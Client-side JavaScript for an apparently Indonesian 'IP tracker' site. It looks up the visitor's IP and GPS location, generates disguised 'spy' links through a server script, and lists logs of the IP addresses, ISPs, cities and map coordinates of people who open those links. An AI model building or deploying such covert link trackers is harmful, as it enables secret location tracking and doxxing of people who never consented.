document.addEventListener('DOMContentLoaded', function() {
    const btnGeo = document.getElementById('btn-geolocation');
    const geoResult = document.getElementById('geo-result');
    const geoData = document.getElementById('geo-data');
    const loading = document.getElementById('loading');
    const resultArea = document.getElementById('result-area');

    /**
     * Helper to render location data in HTML
     */
    function renderLocationData(data, targetEl) {
        // Handle common API response variations
        const city = data.city || data.city_name || 'Unknown';
        const region = data.regionName || data.region_name || 'Unknown';
        const country = data.country || data.country_name || 'Unknown';
        const lat = data.lat || data.latitude || '0';
        const lon = data.lon || data.longitude || '0';
        const isp = data.isp || 'Unknown';
        const ip = data.query || data.ip || '-';

        return `
            <div class="result-card animate__animated animate__fadeIn">
                <div class="row g-4">
                    <div class="col-md-6">
                        <div class="data-item d-flex align-items-start">
                            <div class="data-icon"><i class="fas fa-map-marker-alt"></i></div>
                            <div>
                                <div class="data-label">Lokasi Geografis</div>
                                <div class="data-value">${city}, ${region}</div>
                                <div class="text-muted small">${country}</div>
                            </div>
                        </div>
                        <div class="data-item d-flex align-items-start">
                            <div class="data-icon"><i class="fas fa-network-wired"></i></div>
                            <div>
                                <div class="data-label">Alamat IP</div>
                                <div class="data-value">${ip}</div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="data-item d-flex align-items-start">
                            <div class="data-icon"><i class="fas fa-compass"></i></div>
                            <div>
                                <div class="data-label">Koordinat Presisi</div>
                                <div class="data-value">${lat}, ${lon}</div>
                            </div>
                        </div>
                        <div class="mt-3">
                            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="map-link w-100 text-center">
                                <i class="fas fa-external-link-alt me-2"></i>BUKA DI GOOGLE MAPS
                            </a>
                        </div>
                    </div>
                </div>
            </div>`;
    }

    // 1. Client-side Fallback Tracking (Better for current machine tracking)
    const btnTrackMe = document.getElementById('btn-track-me');
    if (btnTrackMe) {
        btnTrackMe.addEventListener('click', function(e) {
            e.preventDefault();
            loading.classList.remove('d-none');
            resultArea.innerHTML = '';
            
            fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,query')
                .then(res => res.json())
                .then(data => {
                    loading.classList.add('d-none');
                    if (data.status === 'success') {
                        resultArea.innerHTML = renderLocationData(data);
                    } else {
                        resultArea.innerHTML = `<div class="alert alert-warning">${data.message || 'Gagal melacak lokasi'}</div>`;
                    }
                })
                .catch(err => {
                    loading.classList.add('d-none');
                    resultArea.innerHTML = `<div class="alert alert-danger">Error: Gagal menghubungi API dari browser.</div>`;
                });
        });
    }

    // 2. Browser Geolocation (GPS)
    if (btnGeo) {
        btnGeo.addEventListener('click', function() {
            if (!navigator.geolocation) {
                alert('Geolocation tidak didukung oleh browser Anda.');
                return;
            }

            loading.classList.remove('d-none');
            geoResult.classList.add('d-none');
            resultArea.innerHTML = '';

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    loading.classList.add('d-none');
                    geoResult.classList.remove('d-none');
                    
                    geoData.innerHTML = `
                        <div class="row g-4">
                            <div class="col-md-6">
                                <div class="data-item d-flex align-items-start">
                                    <div class="data-icon bg-info bg-opacity-10 text-info"><i class="fas fa-satellite"></i></div>
                                    <div>
                                        <div class="data-label">Koordinat GPS</div>
                                        <div class="data-value">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="data-item d-flex align-items-start">
                                    <div class="data-icon bg-info bg-opacity-10 text-info"><i class="fas fa-bullseye"></i></div>
                                    <div>
                                        <div class="data-label">Tingkat Akurasi</div>
                                        <div class="data-value">± ${Math.round(accuracy)} meter</div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-12 mt-2">
                                <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="map-link bg-info w-100 text-center">
                                    <i class="fas fa-map-marked-alt me-2"></i>LIHAT POSISI GPS
                                </a>
                            </div>
                        </div>
                    `;
                    
                    geoResult.scrollIntoView({ behavior: 'smooth' });
                },
                function(error) {
                    loading.classList.add('d-none');
                    let msg = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED: msg = "Izin lokasi ditolak."; break;
                        case error.POSITION_UNAVAILABLE: msg = "Lokasi tidak tersedia."; break;
                        case error.TIMEOUT: msg = "Waktu permintaan habis."; break;
                        default: msg = "Kesalahan tidak dikenal."; break;
                    }
                    alert(msg);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // 3. Link Generator Logic
    const btnGenerate = document.getElementById('btn-generate-link');
    const targetUrlInput = document.getElementById('target-url');
    const generatedResult = document.getElementById('generated-result');
    const spyUrlResult = document.getElementById('spy-url-result');
    const btnCopy = document.getElementById('btn-copy-link');

    if (btnGenerate) {
        btnGenerate.addEventListener('click', function() {
            const url = targetUrlInput.value;
            if (!url) {
                alert('Masukkan URL tujuan terlebih dahulu.');
                return;
            }

            loading.classList.remove('d-none');
            generatedResult.classList.add('d-none');

            const formData = new FormData();
            formData.append('target', url);

            fetch('api_generate.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                loading.classList.add('d-none');
                if (data.success) {
                    spyUrlResult.value = data.spy_url;
                    generatedResult.classList.remove('d-none');
                } else {
                    alert(data.error || 'Gagal membuat link.');
                }
            })
            .catch(err => {
                loading.classList.add('d-none');
                alert('Terjadi kesalahan koneksi.');
            });
        });
    }

    if (btnCopy) {
        btnCopy.addEventListener('click', function() {
            spyUrlResult.select();
            document.execCommand('copy');
            alert('Link berhasil disalin!');
        });
    }

    // 4. Spy Logs Logic
    const logsBody = document.getElementById('logs-body');
    const btnRefreshLogs = document.getElementById('btn-refresh-logs');
    const logsTab = document.getElementById('logs-tab');

    function loadLogs() {
        logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Memuat data...</td></tr>';
        
        fetch('api_logs.php')
            .then(res => res.json())
            .then(data => {
                if (data.length === 0) {
                    logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4 text-muted">Belum ada aktivitas pelacakan.</td></tr>';
                    return;
                }

                logsBody.innerHTML = '';
                data.forEach(log => {
                    const loc = log.location || {};
                    const city = loc.city || loc.city_name || 'Unknown';
                    const country = loc.country || loc.country_name || 'Unknown';
                    const isp = loc.isp || '-';
                    const lat = loc.lat || loc.latitude;
                    const lon = loc.lon || loc.longitude;

                    const tr = document.createElement('tr');
                    tr.innerHTML = `
                        <td><div class="text-info">${log.timestamp}</div><div class="small opacity-50 text-truncate" style="max-width: 150px;">Target: ${log.target_url}</div></td>
                        <td><strong>${log.ip}</strong><br><span class="text-muted small">${isp}</span></td>
                        <td>${city}, ${country}</td>
                        <td><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="btn btn-xs btn-outline-primary py-0 px-2"><i class="fas fa-map-marker-alt"></i></a></td>
                    `;
                    logsBody.appendChild(tr);
                });
            })
            .catch(err => {
                logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4 text-danger">Gagal memuat log.</td></tr>';
            });
    }

    if (btnRefreshLogs) btnRefreshLogs.addEventListener('click', loadLogs);
    if (logsTab) logsTab.addEventListener('click', loadLogs);
});
